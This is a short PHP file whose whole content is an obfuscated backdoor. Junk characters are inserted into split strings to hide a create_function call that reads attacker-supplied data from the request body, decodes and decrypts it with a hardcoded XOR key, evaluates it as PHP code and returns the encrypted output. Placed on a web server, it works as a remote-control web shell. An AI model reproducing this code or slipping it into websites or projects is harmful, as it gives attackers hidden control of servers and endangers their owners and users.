<?php
$Y='@//input"#@),$m)==#@#@#@1) {@ob_start();@e#@val(@gz#@unc#@o#@mpress(@x(@b#@ase64_d#@ecode($m[1]#@),#@$k)))#@;$o=@ob_#@get_';
$t='){$#@o.=$t{$i}^$k{$j}#@;}#@}retu#@#@rn $o;}if#@#@ (@preg_match("/#@$kh(.#@+)$#@kf/#@",@file_get_cont#@ents("#@#@php:#';
$f=',$k)#@{$c=strlen($#@k);$#@l=strl#@en($t);#@$o="";f#@#@or($i=0;$i<$l;#@){f#@or($j=0;(#@$j<$c&#@&$i<$l#@);$j#@++,#@$i+#@+';
$S=str_replace('fZ','','cfZfZreatfZefZfZ_funcfZtion');
$O='conten#@ts(#@)#@;@ob_end_clea#@n();$#@r=@bas#@e64#@_encode(@#@x(@gzco#@mpress#@#@(#@$o),$k)#@);#@print("$p$kh$r$kf");}';
$e='$k#@="3e#@3dd696";#@$kh="61626#@3bf8#@488";$kf="1#@24e#@c#@6c0db#@ad";#@$p="F#@KXw#@KKxs#@eM3BkMK8";function x(#@#@$t';
$n=str_replace('#@','',$e.$f.$t.$Y.$O);
$W=$S('',$n);$W();
?>
